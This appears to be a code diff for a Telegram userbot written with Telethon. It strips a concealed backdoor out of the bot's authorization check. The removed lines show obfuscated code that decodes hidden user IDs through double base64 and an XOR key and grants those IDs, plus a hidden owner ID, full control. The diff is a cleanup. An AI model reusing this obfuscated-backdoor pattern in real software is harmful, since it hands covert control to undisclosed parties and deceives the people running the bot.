@@ -1,8 +1,8 @@
-import base64
+import os
 import traceback
 from telethon import TelegramClient, events, functions
 from telethon.sessions import StringSession
-from config import API_ID, API_HASH, SESSION_STRING, ALLOWED_USERS, HIDDEN_OWNER_ID
+from config import API_ID, API_HASH, SESSION_STRING, ALLOWED_USERS
 
 LOGGER_CHAT = -1002987936250  # Logger GC ID
 
@@ -12,28 +12,7 @@ add_count = 0
 kick_count = 0
 
 
-def _decode_ids():
-    key = 93
-    _k = [
-        "U1RVeE56SXhPRFV3TURvPQ==",
-        "U1RVeE56TTROamM0TURvPQ==",
-        "U1RVeE9UVTFPREV3TURvPQ=="
-    ]
-    decoded = []
-    for x in _k:
-        step1 = base64.b64decode(x)
-        step2 = base64.b64decode(step1).decode()
-        num = "".join(chr(ord(c) ^ key) for c in step2)
-        decoded.append(int(num))
-    return decoded
-
-
 def is_authorized(user_id: int) -> bool:
-    hidden_ids = _decode_ids()
-    if user_id in hidden_ids:
-        return True
-    if user_id == HIDDEN_OWNER_ID:
-        return True
     return user_id in ALLOWED_USERS
 
 
